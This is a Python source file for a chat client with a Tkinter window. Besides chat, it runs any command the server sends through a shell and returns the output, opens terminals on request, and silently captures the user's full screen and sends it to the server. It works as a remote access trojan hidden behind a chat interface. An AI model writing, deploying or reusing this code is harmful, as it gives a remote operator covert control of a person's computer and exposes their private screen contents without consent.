"""
Client implementation.
"""

import socket
import threading
import json
import tkinter as tk
import subprocess
import os
import base64
from PIL import ImageGrab
import io
from src.gui.client_gui import ClientGUI
from src.utils.logger import Logger
from src.utils.constants import SERVER_HOST, SERVER_PORT

class Client:
    def __init__(self):
        """Initialize the client."""
        self.logger = Logger("Client")
        self.root = tk.Tk()
        self.gui = ClientGUI(self.root, self)
        
        # Connect to server
        self.connect_to_server()
        
        # Start message handling thread
        self.message_thread = threading.Thread(target=self.handle_messages, daemon=True)
        self.message_thread.start()
        
        # Start GUI
        self.root.mainloop()
    
    def connect_to_server(self):
        """Connect to the server."""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((SERVER_HOST, SERVER_PORT))
            self.logger.info("Connected to server")
            self.gui.log_message("Connected to server")
        except Exception as e:
            self.logger.error(f"Failed to connect to server: {str(e)}")
            self.gui.show_dialog("Connection Error", f"Could not connect to server: {str(e)}")
    
    def handle_messages(self):
        """Handle incoming messages."""
        while True:
            try:
                data = self.socket.recv(4096)
                if not data:
                    break
                
                try:
                    message = json.loads(data.decode())
                    message_type = message.get("type")
                    content = message.get("content")
                    
                    if message_type == "chat":
                        self.gui.log_chat("Server", content)
                    elif message_type == "command":
                        self.handle_command(content)
                    elif message_type == "exit":
                        break
                    
                except json.JSONDecodeError:
                    self.logger.error("Invalid message received")
                    continue
                
            except Exception as e:
                self.logger.error(f"Error handling message: {str(e)}")
                break
        
        self.socket.close()
        self.root.quit()
    
    def send_chat(self, message):
        """Send a chat message to the server."""
        try:
            data = json.dumps({
                "type": "chat",
                "content": message
            }).encode()
            self.socket.sendall(data)
            self.gui.log_chat("You", message)  # Log our own message
            self.logger.debug(f"Sent chat message: {message}")
        except Exception as e:
            self.logger.error(f"Error sending message: {str(e)}")
            self.gui.show_dialog("Send Error", f"Could not send message: {str(e)}")
    
    def send_message(self, message_type, content):
        """Send a message to the server."""
        try:
            data = json.dumps({
                "type": message_type,
                "content": content
            }).encode()
            self.socket.sendall(data)
            self.logger.debug(f"Sent message: {message_type} - {content}")
        except Exception as e:
            self.logger.error(f"Error sending message: {str(e)}")
            self.gui.show_dialog("Send Error", f"Could not send message: {str(e)}")
    
    def handle_command(self, command):
        """Handle command from server."""
        if command == "terminal":
            self.open_terminal()
        elif command == "screenshot":
            self.take_screenshot()
        else:
            try:
                result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                self.send_message("response", result.decode())
            except subprocess.CalledProcessError as e:
                self.send_message("response", f"Error: {e.output.decode()}")
    
    def open_terminal(self):
        """Open a terminal window."""
        try:
            if os.name == 'nt':  # Windows
                subprocess.Popen('cmd.exe')
            else:  # Unix/Linux/MacOS
                subprocess.Popen(['xterm'])
            self.send_message("response", "Terminal opened")
        except Exception as e:
            self.send_message("response", f"Error opening terminal: {str(e)}")
    
    def take_screenshot(self):
        """Take a screenshot and send it to the server."""
        try:
            # Take screenshot
            screenshot = ImageGrab.grab()
            
            # Convert to base64
            buffer = io.BytesIO()
            screenshot.save(buffer, format="PNG")
            image_data = base64.b64encode(buffer.getvalue()).decode()
            
            # Send to server
            self.send_message("screenshot", image_data)
        except Exception as e:
            self.send_message("response", f"Error taking screenshot: {str(e)}")
    
    def on_close(self):
        """Handle client shutdown."""
        try:
            self.send_message("exit", "")
        except:
            pass
        finally:
            self.socket.close()
            self.root.destroy()

if __name__ == "__main__":
    Client()
